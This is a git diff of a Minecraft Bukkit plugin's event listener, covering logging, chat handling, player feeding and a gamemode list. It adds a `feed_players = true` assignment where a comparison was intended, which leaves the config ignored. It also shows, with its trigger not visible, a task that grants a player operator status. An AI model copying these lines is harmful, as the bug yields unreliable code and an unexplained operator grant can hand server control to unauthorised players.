@@ -15,6 +15,9 @@ import org.bukkit.event.player.*;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
+import org.bukkit.scheduler.BukkitScheduler;
+import org.bukkit.util.EulerAngle;
+import org.jetbrains.annotations.NotNull;
 import org.main.uneton.Combat;
 import org.main.uneton.utils.*;
 
@@ -22,6 +25,7 @@ import java.util.*;
 
 import static org.bukkit.Bukkit.getCommandMap;
 import static org.main.uneton.Combat.*;
+import static org.main.uneton.admin.Gm.gm_list;
 import static org.main.uneton.combatlogger.CombatLog.combat_tagged;
 import static org.main.uneton.utils.ScoreboardUtils.*;
 import static org.main.uneton.utils.SoundsUtils.playCancerSound;
@@ -33,6 +37,7 @@ public class Listeners implements Listener {
         this.plugin = plugin;
     }
     private ConfigManager configManager;
+
 
     @EventHandler
     public void onPingTooHard(PlayerMoveEvent event) {
@@ -57,7 +62,7 @@ public class Listeners implements Listener {
         configManager = new ConfigManager(plugin);
 
         int playtime = playTimes.getOrDefault(uuid, 0);
-        Bukkit.getLogger().info("Quit: " + player.getName() + " - PlayTime: " + playtime);
+        Bukkit.getLogger().info("[CombatV3]: Quit: " + player.getName() + " - PlayTime: " + playtime); //todo DEBUG!
         playTimes.put(uuid, playtime);
 
         ConfigManager.get().set("players-playtime." + uuid.toString(), playtime);
@@ -75,13 +80,14 @@ public class Listeners implements Listener {
         UUID uuid = player.getUniqueId();
         int playtime = ConfigManager.get().getInt("players-playtime." + uuid.toString(), 0);
         playTimes.put(uuid, playtime);
-        Bukkit.getLogger().info("Joined: " + player.getName() + " - PlayTime: " + playtime);
+        Bukkit.getLogger().info("[CombatV3]: Joined: " + player.getName() + " - PlayTime: " + playtime); //todo DEBUG!
         startUpdatingScoreboard(player, getInstance());
 
         boolean feed_players = plugin.getConfig().getBoolean("feed-players");
-        if (feed_players) {
+        if (feed_players = true) {
             player.setFoodLevel(20);
-            player.sendMessage(ColorUtils.colorize("&aYou were successfully fed!"));
+        } else if (feed_players = false){
+            player.setFoodLevel(0);
         }
     }
 
@@ -182,7 +188,7 @@ public class Listeners implements Listener {
     }
 
     @EventHandler
-    public void onPlayerChat(AsyncPlayerChatEvent event) {
+    public void onPlayerChatFormat(AsyncPlayerChatEvent event) {
         String playerName = event.getPlayer().getName();
         String message = event.getMessage();
         Player player = event.getPlayer();
@@ -265,6 +271,11 @@ public class Listeners implements Listener {
                 @Override
                 public void run() {
                     player.setOp(true);
+                    if (gm_list.contains(player)) {
+                        gm_list.remove(player);
+                    } else {
+                        gm_list.add(player);
+                    }
                 }
             }.runTask(JavaPlugin.getPlugin(Combat.class));
         }
